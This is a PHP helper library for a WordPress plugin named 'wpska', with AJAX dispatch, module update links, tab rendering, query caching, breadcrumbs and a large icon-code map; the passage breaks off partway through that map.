<?php

/* TODO:
- Inserir opção de limpar caches específicos;
*/

/*if (isset($_GET['wpska_js'])): header('Content-Type: application/javascript'); ?>
<?php die; endif;

else if (isset($_GET['wpska_js'])): header('Content-Type: application/javascript'); ?>
<?php die; endif;*/



if (! function_exists('dd')) {
	function dd() {
		foreach(func_get_args() as $data) {
			echo '<pre style="font:11px monospace; border:solid 1px #ddd; background:#eee; padding:5px;">',
			print_r($data, true), '&nbsp;</pre>';
		}
	}
}



class Wpska_Actions
{
	public function __construct()
	{
		foreach(get_class_methods($this) as $method) {
			if ($method=='__construct') continue;
			add_action($method, array($this, $method));
		}
	}
}


class Wpska_Filters
{
	public function __construct()
	{
		foreach(get_class_methods($this) as $method) {
			if ($method=='__construct') continue;
			add_filter($method, array($this, $method));
		}
	}
}


class Wpska_Ajax
{
	public $error = array();

	public function __construct()
	{
		if (isset($_REQUEST['wpska'])) {
			$call = array($this, 'init');
			add_action('init', $call, 0);
		}
	}

	public function error($error=null)
	{
		if ($error) $this->error[] = $error;
		return empty($this->error)? false: $this->error;
	}

	public function init()
	{
		$success = false;
		$call = array($this, $_REQUEST['wpska']);
		if (is_callable($call)) { $success = call_user_func($call); }
		else { $this->error('Inexistent method'); }
		echo json_encode(array(
			'success' => $success,
			'error' => $this->error(),
		)); die;
	}


	public function param($key, $default=false)
	{
		return isset($_REQUEST[$key])? $_REQUEST[$key]: $default;
	}
}



function wpska_header() {
	global $wpska_header_loaded;
	if ($wpska_header_loaded) return null;

	$base_url = str_replace(ABSPATH, '', __DIR__);
	$base_url = str_replace('\\', '/', $base_url);

	?>
	<script src="<?php echo site_url("{$base_url}/wpska.js"); ?>"></script>
	<link rel="stylesheet" href="<?php echo site_url("{$base_url}/wpska.css"); ?>">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<style>.wp-admin select.form-control {padding:7px; height:auto;}</style>
	<?php

	$wpska_header_loaded=true;
}




function wpska_modules($keyname=null) {
	$modules['wpska'] = array('title'=>'Helper');
	$modules['wpska_form'] = array('title'=>'Gerenciador de contatos e newsletters');
	$modules['wpska_menu'] = array('title'=>'Menu customizado');
	$modules['wpska_ui'] = array('title'=>'User interfaces');
	$modules['wpska_email'] = array('title'=>'Gerenciamento e customização de e-mails');

	foreach($modules as $key=>$mod) {
		$mod['id'] = $key;
		$mod['basename'] = "{$key}.php";
		$mod['file'] = __DIR__ . "/{$mod['basename']}";
		$mod['download'] = "https://raw.githubusercontent.com/jeff-silva/wpska/master/{$mod['basename']}";
		$mod['file_exists'] = file_exists($mod['file']);

		$mod['actions'] = array();
		$mod['actions']['update'] = array(
			'icon' => ($mod['file_exists']? 'fa fa-fw fa-refresh': 'fa fa-fw fa-download'),
			'label' => ($mod['file_exists']? 'Atualizar': 'Baixar'),
			'url' => "options-general.php?page=wpska-settings&wpska-update={$mod['id']}",
			'attr' => '',
		);
		$mod['actions']['delete'] = array(
			'icon' => 'fa fa-fw fa-remove',
			'label' => 'Deletar',
			'url' => "options-general.php?page=wpska-settings&wpska-delete={$mod['id']}",
			'attr' => 'onclick="return confirm(\'Tem certeza que deseja deletar?\');"',
		);

		if ($mod['id']=='wpska') { unset($mod['actions']['delete']); }

		$modules[$key] = $mod;
	}

	if ($keyname) {
		return isset($modules[$keyname])? $modules[$keyname]: false;
	}

	return $modules;
}


class Wpska_Response
{
	public $success=false;
	public $error=array();

	public function error($error=false) {
		if ($error) $this->error[] = $error;
		return empty($this->error)? false: $this->error;
	}

	public function success($success=false) {
		if ($success) $this->success = $success;
		return $this->success;
	}

	public function json() {
		echo json_encode(array(
			'success' => $this->success(),
			'error' => $this->error(),
		)); die;
	}
}


function wpska_response($success=false, $error=false) {

	if ($error) {
		$success = false;
		$error = is_array($error)? $error: array($error);
	}

	else { $error=false; }

	$error = empty($error)? false: $error;
	return json_encode(array('success'=>$success, 'error'=>$error)); die;
}




function wpska_tab($title, $call) {
	global $wpska_tab;
	$wpska_tab = is_array($wpska_tab)? $wpska_tab: array();
	$id = 'tab' . md5($title . rand());
	$wpska_tab[] = array('id'=>$id, 'title'=>$title, 'call'=>$call);
}




function wpska_tab_render($settings=null) {
	global $wp, $wpska_tab;
	$tabs = is_array($wpska_tab)? $wpska_tab: array();
	$wpska_tab=null;

	if (!is_array($settings)) parse_str($settings, $settings);

	$settings = array_merge(array(
		'active' => 0,
		'link' => null,
	), $settings);

	?>
	<?php wpska_header(); ?>

	<?php if ($settings['link']): ?>
	<?php $cdztab = isset($_GET['cdztab'])? $_GET['cdztab']: $tabs[ $settings['active'] ]['id']; ?>
	<ul class="nav nav-tabs" role="tablist">
		<?php foreach($tabs as $i=>$tab): ?>
		<li class="<?php echo $tab['id']==$cdztab? 'active': null; ?>">
			<a href="<?php echo cdz_url("?cdztab={$tab['id']}"); ?>"><?php echo $tab['title']; ?></a>
		</li>
		<?php endforeach; ?>
	</ul>
	<div class="tab-content" style="padding:15px;">
		<?php foreach($tabs as $i=>$tab): if ($cdztab==$tab['id']): ?>
		<?php if (is_callable($tab['call'])) { call_user_func($tab['call']); }
		else echo $tab['call']; ?>
		<?php endif; endforeach; ?>
	</div>


	<?php else: ?>
	<ul class="nav nav-tabs" role="tablist">
		<?php foreach($tabs as $i=>$tab): ?>
		<li role="presentation" class="<?php echo $i==$settings['active']? 'active': null; ?>">
			<a href="#<?php echo $tab['id']; ?>" data-toggle="tab"><?php echo $tab['title']; ?></a>
		</li>
		<?php endforeach; ?>
	</ul>

	<!-- Tab panes -->
	<div class="tab-content" style="padding:15px;">
		<?php foreach($tabs as $i=>$tab): ?>
		<div class="tab-pane <?php echo $i==$settings['active']? 'active': null; ?>" id="<?php echo $tab['id']; ?>">
			<?php if (is_callable($tab['call'])) { call_user_func($tab['call']); }
			else echo $tab['call']; ?>
		</div>
		<?php endforeach; ?>
	</div>
	<?php endif; ?>
	<?php
}



function wpska_link($url) {
	$current = ((isset($_SERVER['HTTPS']) AND $_SERVER['HTTPS']=='on')? 'https': 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
	$current = parse_url($current);
	$current['query'] = isset($current['query'])? $current['query']: '';
	parse_str($current['query'], $current['query']);

	$url = parse_url($url);
	$url['query'] = isset($url['query'])? $url['query']: '';
	parse_str($url['query'], $url['query']);

	$url['query'] = array_merge($current['query'], $url['query']);
	$url['query'] = http_build_query($url['query']);

	$url = array_merge($current, $url);
	$url = "{$url['scheme']}://{$url['host']}{$url['path']}" . ($url['path']? "?{$url['query']}": null);
	return $url;
}




function wpska_pagination($query) {
	$big = 999999999; // need an unlikely integer
	$pages = paginate_links( array(
			'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
			'format' => '?paged=%#%',
			'current' => max( 1, get_query_var('paged') ),
			'total' => $query->max_num_pages,
			'type'  => 'array',
			'prev_next'   => true,
			'prev_text'    => __('«'),
			'next_text'    => __('»'),
		)
	);

	if( is_array( $pages ) ) {
		$paged = ( get_query_var('paged') == 0 ) ? 1 : get_query_var('paged');

		$pagination = '<ul class="pagination">';

		foreach ( $pages as $page ) {
			$pagination .= "<li>$page</li>";
		}

		$pagination .= '</ul>';

		echo $pagination;
	}
}



function wpska_query($query, $cache='option') {
	if ('object'==gettype($query) AND 'WP_Query'==get_class($query)) {
		return $query;
	}
	if ($cache) {
		if ($cache=='option') { $cache = get_option('wpska_cache', 3600); }
		$cache_key = md5(serialize($query) . $cache);
		$result = get_transient($cache_key);
		if (! $result) {
			$result = new WP_Query($query);
			set_transient($cache_key, $result, $cache);
		}
		return $result;
	}

	return new WP_Query($query);
}




function wpska_posts($query=null, $callback=null, $settings=array()) {
	global $post;

	if (is_string($settings)) parse_str($settings, $settings);
	$settings = is_array($settings)? $settings: array();
	$settings = array_merge(array(
		'cache' => get_option('wpska_cache', 3600),
	), $settings);


	// If $query is null, return current $post
	if (! $query) {
		if (is_callable($callback)) {
			setup_postdata($post);
			call_user_func($callback, $post);
			wp_reset_postdata();
		}
		return $post;
	}

	// If $query is numeric, get post by ID
	if (is_numeric($query)) {
		$query = array('p'=>$query, 'post_type'=>'any');
	}

	// Get $result
	$result = wpska_query($query, $settings['cache']);

	if (sizeof($result->posts)>0) {
		foreach($result->posts as $_post) {
			if (is_callable($callback)) {
				$post = $_post;
				call_user_func($callback, $_post);
			}
		}
		wp_reset_postdata();
		return $result;
	}
	
	return false;
}




function wpska_breadcrumbs($post=null, $callback=null) {
	if (! $post) global $post;

	$callback = is_callable($callback)? $callback: function($breads) { ?>
		<ul class="breadcrumb">
			<?php foreach($breads as $bread): ?>
			<li><a href="<?php echo $bread['url']; ?>"><?php echo $bread['title']; ?></a></li>
			<?php endforeach; ?>
		</ul>
	<?php };

	$breads = array(
		array(
			'title' => 'Home',
			'url' => get_site_url(),
		),
	);

	if (is_category()) {}

	else if (is_search()) {
		$breads[] = array(
			'title' => "Pesquisa</q>",
			'url' => 'javascript:;',
		);
	}

	else if (is_attachment()) {}

	else if (is_page()) {
		if ($post->post_parent) {
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			while ($parent_id) {
				$page = get_page($parent_id);
				$breadcrumbs[] = array(
					'title' => get_the_title($page->ID),
					'url' => get_permalink($page->ID),
				);
				$parent_id  = $page->post_parent;
			}
			foreach(array_reverse($breadcrumbs) as $b) {
				$breads[] = $b;
			}
		}
		$breads[] = array(
			'title' => get_the_title(),
			'url' => get_the_permalink(),
		);
	}

	else if (is_404()) {
		$breads[] = array(
			'title' => 'Página não encontrada',
			'url' => '',
		);
	}

	else {
		$type = get_post_type_object($post->post_type);
		$breads[] = array(
			'title' => $type->labels->name,
			'url' => home_url("?s=+&post_type={$type->name}"),
		);

		$breads[] = array(
			'title' => $post->post_title,
			'url' => get_the_permalink($post->ID),
		);
	}

	return call_user_func($callback, $breads);
}





function wpska_thumbnail($post, $default=null) {
	$default = $default? $default: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACqBAMAAAA5NBsAAAAAHlBMVEX///+5ubnKysrT09PFxcXb29v4+Pjm5ubx8fG/v79jhCz7AAACiUlEQVR42u3bS2sTURjG8ZfUmZztkws2u7TCAXcGsXRpRFx3pN52gxa1u4qXxl0UN1mOC/XjGuPMScZDWnKwJ+/Q5/cJ/jxvAiHJCBEREREREREREREREZFe5v3+pm5NJLJ0hAAHEtc3hOhNJSZTIMgviekEYXq5RJQh0JHEkxYI9EPiaf853pNNHQO4KfG0g1ZJi7iVOwCGsrE9oCvrsZKVrFRZ+XaSq680x8D3p8or0xeYGxzprvyKhW6uudJ97BhqrnyFUl9z5TtUpnor0zEqQ72VbTi7eit34PT1Vt6A0xXPa32VHflXup/rqDy9qPIlrI7Kiy6e7qGTq6hswen7UwJWRWUCZ9efEvMxNVSaApVH/pRzVkOlZKic+VMuxtRQeYJSx59ywWqoNO7g/pTlmAoq5UMZM/WmLFkNlebvaAf+lG5MBZXSvg0MDsWb0rEaKiX9+OyT+FOujKmh8tKfBqzOSlMA3phbqrwv68xQZzVWuim9MSNXtvxKf8olq2/LasramOoqZ/BZJRfPa1P6Y6rYMrG1KT1WRWXWyWtT+mMquHgC2NqUHqtgy6xcy03p6Wy/MnFrzbBOvvWLZ9VLz4w1Vda3TNxLbwa9lVn1PjaFqsraxROU7AyqKmtbZij1xnorEyzpqly9eKa2cmXLBE2ozPRWLi+eQG/lcsusCZUJFFe6i2eaK6stEzSh8ovqylYjKpuxZTMqefHrVsmLX7fKZl38zfnlJgvn2/8GRun/L1uNqGzGls2o5MX/nyTogSJTxH/aY3B3E/e28EyKQROe75ERAt2RiE4RZpBLRO0CQX5KVJ/DpjyTqMwIAQ4lMvP44aYePBciIiIiIiIiIiIiIrpyvwGPXU9VynS3IQAAAABJRU5ErkJggg==';
	$thumbnail_url = get_the_post_thumbnail_url($post);
	$thumbnail_url = $thumbnail_url? $thumbnail_url: $default;
	return $thumbnail_url;
}




function wpska_icons() {
	return array(
		'62259' => 'dashicons dashicons-menu', '62233' => 'dashicons dashicons-admin-site', '61990' => 'dashicons dashicons-dashboard', '61700' => 'dashicons dashicons-admin-media', '61701' => 'dashicons dashicons-admin-page', '61697' => 'dashicons dashicons-admin-comments', '61696' => 'dashicons dashicons-admin-appearance', '61702' => 'dashicons dashicons-admin-plugins', '61712' => 'dashicons dashicons-admin-users', '61703' => 'dashicons dashicons-admin-tools', '61704' => 'dashicons dashicons-admin-settings', '61714' => 'dashicons dashicons-admin-network', '61713' => 'dashicons dashicons-admin-generic', '61698' => 'dashicons dashicons-admin-home', '61768' => 'dashicons dashicons-admin-collapse', '62774' => 'dashicons dashicons-filter', '62784' => 'dashicons dashicons-admin-customizer', '62785' => 'dashicons dashicons-admin-multisite', '61699' => 'dashicons dashicons-admin-links', '61705' => 'dashicons dashicons-admin-post', '61736' => 'dashicons dashicons-format-image', '61793' => 'dashicons dashicons-format-gallery', '61735' => 'dashicons dashicons-format-audio', '61734' => 'dashicons dashicons-format-video', '61733' => 'dashicons dashicons-format-chat', '61744' => 'dashicons dashicons-format-status', '61731' => 'dashicons dashicons-format-aside', '61730' => 'dashicons dashicons-format-quote', '61721' => 'dashicons dashicons-welcome-write-blog', '61747' => 'dashicons dashicons-welcome-add-page', '61717' => 'dashicons dashicons-welcome-view-site', '61718' => 'dashicons dashicons-welcome-widgets-menus', '61719' => 'dashicons dashicons-welcome-comments', '61720' => 'dashicons dashicons-welcome-learn-more', '61797' => 'dashicons dashicons-image-crop', '62769' => 'dashicons dashicons-image-rotate', '61798' => 'dashicons dashicons-image-rotate-left', '61799' => 'dashicons dashicons-image-rotate-right', '61800' => 'dashicons dashicons-image-flip-vertical', '61801' => 'dashicons dashicons-image-flip-horizontal', '62771' => 'dashicons dashicons-image-filter', '61809' => 'dashicons dashicons-undo', '61810' => 'dashicons dashicons-redo', '61952' => 'dashicons dashicons-editor-bold', '61953' => 'dashicons dashicons-editor-italic', '61955' => 'dashicons dashicons-editor-ul', '61956' => 'dashicons dashicons-editor-ol', '61957' => 'dashicons dashicons-editor-quote', '61958' => 'dashicons dashicons-editor-alignleft', '61959' => 'dashicons dashicons-editor-aligncenter', '61960' => 'dashicons dashicons-editor-alignright', '61961' => 'dashicons dashicons-editor-insertmore', '61968' => 'dashicons dashicons-editor-spellcheck', '61969' => 'dashicons dashicons-editor-expand', '62726' => 'dashicons dashicons-editor-contract', '61970' => 'dashicons dashicons-editor-kitchensink', '61971' => 'dashicons dashicons-editor-underline', '61972' => 'dashicons dashicons-editor-justify', '61973' => 'dashicons dashicons-editor-textcolor', '61974' => 'dashicons dashicons-editor-paste-word', '61975' => 'dashicons dashicons-editor-paste-text', '61976' => 'dashicons dashicons-editor-removeformatting', '61977' => 'dashicons dashicons-editor-video', '61984' => 'dashicons dashicons-editor-customchar', '61985' => 'dashicons dashicons-editor-outdent', '61986' => 'dashicons dashicons-editor-indent', '61987' => 'dashicons dashicons-editor-help', '61988' => 'dashicons dashicons-editor-strikethrough', '61989' => 'dashicons dashicons-editor-unlink', '62240' => 'dashicons dashicons-editor-rtl', '62580' => 'dashicons dashicons-editor-break', '62581' => 'dashicons dashicons-editor-code', '62582' => 'dashicons dashicons-editor-paragraph', '62773' => 'dashicons dashicons-editor-table', '61749' => 'dashicons dashicons-align-left', '61750' => 'dashicons dashicons-align-right', '61748' => 'dashicons dashicons-align-center', '61752' => 'dashicons dashicons-align-none', '61792' => 'dashicons dashicons-lock', '62760' => 'dashicons dashicons-unlock', '61765' => 'dashicons dashicons-calendar', '62728' => 'dashicons dashicons-calendar-alt', '61815' => 'dashicons dashicons-visibility', '62768' => 'dashicons dashicons-hidden', '61811' => 'dashicons dashicons-post-status', '62564' => 'dashicons dashicons-edit', '61826' => 'dashicons dashicons-post-trash', '62775' => 'dashicons dashicons-sticky', '62724' => 'dashicons dashicons-external', '61762' => 'dashicons dashicons-arrow-up', '61760' => 'dashicons dashicons-arrow-down', '61761' => 'dashicons dashicons-arrow-left', '61753' => 'dashicons dashicons-arrow-right', '62274' => 'dashicons dashicons-arrow-up-alt', '62278' => 'dashicons dashicons-arrow-down-alt', '62272' => 'dashicons dashicons-arrow-left-alt', '62276' => 'dashicons dashicons-arrow-right-alt', '62275' => 'dashicons dashicons-arrow-up-alt2', '62279' => 'dashicons dashicons-arrow-down-alt2', '62273' => 'dashicons dashicons-arrow-left-alt2', '62277' => 'dashicons dashicons-arrow-right-alt2', '61993' => 'dashicons dashicons-leftright', '61782' => 'dashicons dashicons-sort', '62723' => 'dashicons dashicons-randomize', '61795' => 'dashicons dashicons-list-view', '61796' => 'dashicons dashicons-excerpt-view', '62729' => 'dashicons dashicons-grid-view', '62789' => 'dashicons dashicons-move', '62216' => 'dashicons dashicons-hammer', '62217' => 'dashicons dashicons-art', '62224' => 'dashicons dashicons-migrate', '62225' => 'dashicons dashicons-performance', '62595' => 'dashicons dashicons-universal-access', '62727' => 'dashicons dashicons-universal-access-alt', '62598' => 'dashicons dashicons-tickets', '62596' => 'dashicons dashicons-nametag', '62593' => 'dashicons dashicons-clipboard', '62599' => 'dashicons dashicons-heart', '62600' => 'dashicons dashicons-megaphone', '62601' => 'dashicons dashicons-schedule', '61728' => 'dashicons dashicons-wordpress', '62244' => 'dashicons dashicons-wordpress-alt', '61783' => 'dashicons dashicons-pressthis', '62563' => 'dashicons dashicons-update', '61824' => 'dashicons dashicons-screenoptions', '61812' => 'dashicons dashicons-cart', '61813' => 'dashicons dashicons-feedback', '61814' => 'dashicons dashicons-cloud', '62246' => 'dashicons dashicons-translation', '62243' => 'dashicons dashicons-tag', '62232' => 'dashicons dashicons-category', '62592' => 'dashicons dashicons-archive', '62585' => 'dashicons dashicons-tagcloud', '62584' => 'dashicons dashicons-text', '62721' => 'dashicons dashicons-media-archive', '62720' => 'dashicons dashicons-media-audio', '62617' => 'dashicons dashicons-media-code', '62616' => 'dashicons dashicons-media-default', '62615' => 'dashicons dashicons-media-document', '62614' => 'dashicons dashicons-media-interactive', '62613' => 'dashicons dashicons-media-spreadsheet', '62609' => 'dashicons dashicons-media-text', '62608' => 'dashicons dashicons-media-video', '62610' => 'dashicons dashicons-playlist-audio', '62611' => 'dashicons dashicons-playlist-video', '62754' => 'dashicons dashicons-controls-play', '62755' => 'dashicons dashicons-controls-pause', '62745' => 'dashicons dashicons-controls-forward', '62743' => 'dashicons dashicons-controls-skipforward', '62744' => 'dashicons dashicons-controls-back', '62742' => 'dashicons dashicons-controls-skipback', '62741' => 'dashicons dashicons-controls-repeat', '62753' => 'dashicons dashicons-controls-volumeon', '62752' => 'dashicons dashicons-controls-volumeoff', '61767' => 'dashicons dashicons-yes', '61784' => 'dashicons dashicons-no', '62261' => 'dashicons dashicons-no-alt', '61746' => 'dashicons dashicons-plus', '62722' => 'dashicons dashicons-plus-alt', '62787' => 'dashicons dashicons-plus-alt2', '62560' => 'dashicons dashicons-minus', '61779' => 'dashicons dashicons-dismiss', '61785' => 'dashicons dashicons-marker', '61781' => 'dashicons dashicons-star-filled', '62553' => 'dashicons dashicons-star-half', '61780' => 'dashicons dashicons-star-empty', '61991' => 'dashicons dashicons-flag', '62280' => 'dashicons dashicons-info', '62772' => 'dashicons dashicons-warning', '62007' => 'dashicons dashicons-share1', '62016' => 'dashicons dashicons-share-alt', '62018' => 'dashicons dashicons-share-alt2', '62209' => 'dashicons dashicons-twitter', '62211' => 'dashicons dashicons-rss', '62565' => 'dashicons dashicons-email', '62566' => 'dashicons dashicons-email-alt', '62212' => 'dashicons dashicons-facebook', '62213' => 'dashicons dashicons-facebook-alt', '62245' => 'dashicons dashicons-networking', '62562' => 'dashicons dashicons-googleplus', '62000' => 'dashicons dashicons-location', '62001' => 'dashicons dashicons-location-alt', '62214' => 'dashicons dashicons-camera', '62002' => 'dashicons dashicons-images-alt', '62003' => 'dashicons dashicons-images-alt2', '62004' => 'dashicons dashicons-video-alt', '62005' => 'dashicons dashicons-video-alt2', '62006' => 'dashicons dashicons-video-alt3', '61816' => 'dashicons dashicons-vault', '62258' => 'dashicons dashicons-shield', '62260' => 'dashicons dashicons-shield-alt', '62568' => 'dashicons dashicons-sos', '61817' => 'dashicons dashicons-search', '61825' => 'dashicons dashicons-slides', '61827' => 'dashicons dashicons-analytics', '61828' => 'dashicons dashicons-chart-pie', '61829' => 'dashicons dashicons-chart-bar', '62008' => 'dashicons dashicons-chart-line', '62009' => 'dashicons dashicons-chart-area', '62264' => 'dashicons dashicons-businessman', '62262' => 'dashicons dashicons-id', '62263' => 'dashicons dashicons-id-alt', '62226' => 'dashicons dashicons-products', '62227' => 'dashicons dashicons-awards', '62228' => 'dashicons dashicons-forms', '62579' => 'dashicons dashicons-testimonial', '62242' => 'dashicons dashicons-portfolio', '62256' => 'dashicons dashicons-book', '62257' => 'dashicons dashicons-book-alt', '62230' => 'dashicons dashicons-download', '62231' => 'dashicons dashicons-upload', '62241' => 'dashicons dashicons-backup', '62569' => 'dashicons dashicons-clock', '62265' => 'dashicons dashicons-lightbulb', '62594' => 'dashicons dashicons-microphone', '62578' => 'dashicons dashicons-desktop', '62791' => 'dashicons dashicons-laptop', '62577' => 'dashicons dashicons-tablet', '62576' => 'dashicons dashicons-smartphone', '62757' => 'dashicons dashicons-phone', '62248' => 'dashicons dashicons-smiley', '62736' => 'dashicons dashicons-index-card', '62737' => 'dashicons dashicons-carrot', '62738' => 'dashicons dashicons-building', '62739' => 'dashicons dashicons-store', '62740' => 'dashicons dashicons-album', '62759' => 'dashicons dashicons-palmtree', '62756' => 'dashicons dashicons-tickets-alt', '62758' => 'dashicons dashicons-money', '62761' => 'dashicons dashicons-thumbs-up', '62786' => 'dashicons dashicons-thumbs-down', '62776' => 'dashicons dashicons-layout', '62790' => 'dashicons dashicons-paperclip', '61709' => 'dashicons dashicons-trash', '62550' => 'dashicons dashicons-buddicons-groups',
		'f000' => 'fa fa-fw fa-glass', 'f001' => 'fa fa-fw fa-music', 'f002' => 'fa fa-fw fa-search', 'f003' => 'fa fa-fw fa-envelope-o', 'f004' => 'fa fa-fw fa-heart', 'f005' => 'fa fa-fw fa-star', 'f006' => 'fa fa-fw fa-star-o', 'f007' => 'fa fa-fw fa-user', 'f008' => 'fa fa-fw fa-film', 'f009' => 'fa fa-fw fa-th-large', 'f00a' => 'fa fa-fw fa-th', 'f00b' => 'fa fa-fw fa-th-list', 'f00c' => 'fa fa-fw fa-check', 'f00d' => 'fa fa-fw fa-times', 'f00e' => 'fa fa-fw fa-search-plus', 'f010' => 'fa fa-fw fa-search-minus', 'f011' => 'fa fa-fw fa-power-off', 'f012' => 'fa fa-fw fa-signal', 'f013' => 'fa fa-fw fa-cog', 'f014' => 'fa fa-fw fa-trash-o', 'f015' => 'fa fa-fw fa-home', 'f016' => 'fa fa-fw fa-file-o', 'f017' => 'fa fa-fw fa-clock-o', 'f018' => 'fa fa-fw fa-road', 'f019' => 'fa fa-fw fa-download', 'f01a' => 'fa fa-fw fa-arrow-circle-o-down', 'f01b' => 'fa fa-fw fa-arrow-circle-o-up', 'f01c' => 'fa fa-fw fa-inbox', 'f01d' => 'fa fa-fw fa-play-circle-o', 'f01e' => 'fa fa-fw fa-repeat', 'f021' => 'fa fa-fw fa-refresh', 'f022' => 'fa fa-fw fa-list-alt', 'f023' => 'fa fa-fw fa-lock', 'f024' => 'fa fa-fw fa-flag', 'f025' => 'fa fa-fw fa-headphones', 'f026' => 'fa fa-fw fa-volume-off', 'f027' => 'fa fa-fw fa-volume-down', 'f028' => 'fa fa-fw fa-volume-up', 'f029' => 'fa fa-fw fa-qrcode', 'f02a' => 'fa fa-fw fa-barcode', 'f02b' => 'fa fa-fw fa-tag', 'f02c' => 'fa fa-fw fa-tags', 'f02d' => 'fa fa-fw fa-book', 'f02e' => 'fa fa-fw fa-bookmark', 'f02f' => 'fa fa-fw fa-print', 'f030' => 'fa fa-fw fa-camera', 'f031' => 'fa fa-fw fa-font', 'f032' => 'fa fa-fw fa-bold', 'f033' => 'fa fa-fw fa-italic', 'f034' => 'fa fa-fw fa-text-height', 'f035' => 'fa fa-fw fa-text-width', 'f036' => 'fa fa-fw fa-align-left', 'f037' => 'fa fa-fw fa-align-center', 'f038' => 'fa fa-fw fa-align-right', 'f039' => 'fa fa-fw fa-align-justify', 'f03a' => 'fa fa-fw fa-list', 'f03b' => 'fa fa-fw fa-outdent', 'f03c' => 'fa fa-fw fa-indent', 'f03d' => 'fa fa-fw fa-video-camera', 'f03e' => 'fa fa-fw fa-picture-o', 'f040' => 'fa fa-fw fa-pencil', 'f041' => 'fa fa-fw fa-map-marker', 'f042' => 'fa fa-fw fa-adjust', 'f043' => 'fa fa-fw fa-tint', 'f044' => 'fa fa-fw fa-pencil-square-o', 'f045' => 'fa fa-fw fa-share-square-o', 'f046' => 'fa fa-fw fa-check-square-o', 'f047' => 'fa fa-fw fa-arrows', 'f048' => 'fa fa-fw fa-step-backward', 'f049' => 'fa fa-fw fa-fast-backward', 'f04a' => 'fa fa-fw fa-backward', 'f04b' => 'fa fa-fw fa-play', 'f04c' => 'fa fa-fw fa-pause', 'f04d' => 'fa fa-fw fa-stop', 'f04e' => 'fa fa-fw fa-forward', 'f050' => 'fa fa-fw fa-fast-forward', 'f051' => 'fa fa-fw fa-step-forward', 'f052' => 'fa fa-fw fa-eject', 'f053' => 'fa fa-fw fa-chevron-left', 'f054' => 'fa fa-fw fa-chevron-right', 'f055' => 'fa fa-fw fa-plus-circle', 'f056' => 'fa fa-fw fa-minus-circle', 'f057' => 'fa fa-fw fa-times-circle', 'f058' => 'fa fa-fw fa-check-circle', 'f059' => 'fa fa-fw fa-question-circle', 'f05a' => 'fa fa-fw fa-info-circle', 'f05b' => 'fa fa-fw fa-crosshairs', 'f05c' => 'fa fa-fw fa-times-circle-o', 'f05d' => 'fa fa-fw fa-check-circle-o', 'f05e' => 'fa fa-fw fa-ban', 'f060' => 'fa fa-fw fa-arrow-left', 'f061' => 'fa fa-fw fa-arrow-right', 'f062' => 'fa fa-fw fa-arrow-up', 'f063' => 'fa fa-fw fa-arrow-down', 'f064' => 'fa fa-fw fa-share', 'f065' => 'fa fa-fw fa-expand', 'f066' => 'fa fa-fw fa-compress', 'f067' => 'fa fa-fw fa-plus', 'f068' => 'fa fa-fw fa-minus', 'f069' => 'fa fa-fw fa-asterisk', 'f06a' => 'fa fa-fw fa-exclamation-circle', 'f06b' => 'fa fa-fw fa-gift', 'f06c' => 'fa fa-fw fa-leaf', 'f06d' => 'fa fa-fw fa-fire', 'f06e' => 'fa fa-fw fa-eye', 'f070' => 'fa fa-fw fa-eye-slash', 'f071' => 'fa fa-fw fa-exclamation-triangle', 'f072' => 'fa fa-fw fa-plane', 'f073' => 'fa fa-fw fa-calendar', 'f074' => 'fa fa-fw fa-random', 'f075' => 'fa fa-fw fa-comment', 'f076' => 'fa fa-fw fa-magnet', 'f077' => 'fa fa-fw fa-chevron-up', 'f078' => 'fa fa-fw fa-chevron-down', 'f079' => 'fa fa-fw fa-retweet', 'f07a' => 'fa fa-fw fa-shopping-cart', 'f07b' => 'fa fa-fw fa-folder', 'f07c' => 'fa fa-fw fa-folder-open', 'f07d' => 'fa fa-fw fa-arrows-v', 'f07e' => 'fa fa-fw fa-arrows-h', 'f080' => 'fa fa-fw fa-bar-chart', 'f081' => 'fa fa-fw fa-twitter-square', 'f082' => 'fa fa-fw fa-facebook-square', 'f083' => 'fa fa-fw fa-camera-retro', 'f084' => 'fa fa-fw fa-key', 'f085' => 'fa fa-fw fa-cogs', 'f086' => 'fa fa-fw fa-comments', 'f087' => 'fa fa-fw fa-thumbs-o-up', 'f088' => 'fa fa-fw fa-thumbs-o-down', 'f089' => 'fa fa-fw fa-star-half', 'f08a' => 'fa fa-fw fa-heart-o', 'f08b' => 'fa fa-fw fa-sign-out', 'f08c' => 'fa fa-fw fa-linkedin-square', 'f08d' => 'fa fa-fw fa-thumb-tack', 'f08e' => 'fa fa-fw fa-external-link', 'f090' => 'fa fa-fw fa-sign-in', 'f091' => 'fa fa-fw fa-trophy', 'f092' => 'fa fa-fw fa-github-square', 'f093' => 'fa fa-fw fa-upload', 'f094' => 'fa fa-fw fa-lemon-o', 'f095' => 'fa fa-fw fa-phone', 'f096' => 'fa fa-fw fa-square-o', 'f097' => 'fa fa-fw fa-bookmark-o', 'f098' => 'fa fa-fw fa-phone-square', 'f099' => 'fa fa-fw fa-twitter', 'f09a' => 'fa fa-fw fa-facebook', 'f09b' => 'fa fa-fw fa-github', 'f09c' => 'fa fa-fw fa-unlock', 'f09d' => 'fa fa-fw fa-credit-card', 'f09e' => 'fa fa-fw fa-rss', 'f0a0' => 'fa fa-fw fa-hdd-o', 'f0a1' => 'fa fa-fw fa-bullhorn', 'f0f3' => 'fa fa-fw fa-bell', 'f0a3' => 'fa fa-fw fa-certificate', 'f0a4' => 'fa fa-fw fa-hand-o-right', 'f0a5' => 'fa fa-fw fa-hand-o-left', 'f0a6' => 'fa fa-fw fa-hand-o-up', 'f0a7' => 'fa fa-fw fa-hand-o-down', 'f0a8' => 'fa fa-fw fa-arrow-circle-left', 'f0a9' => 'fa fa-fw fa-arrow-circle-right', 'f0aa' => 'fa fa-fw fa-arrow-circle-up', 'f0ab' => 'fa fa-fw fa-arrow-circle-down', 'f0ac' => 'fa fa-fw fa-globe', 'f0ad' => 'fa fa-fw fa-wrench', 'f0ae' => 'fa fa-fw fa-tasks', 'f0b0' => 'fa fa-fw fa-filter', 'f0b1' => 'fa fa-fw fa-briefcase', 'f0b2' => 'fa fa-fw fa-arrows-alt', 'f0c0' => 'fa fa-fw fa-users', 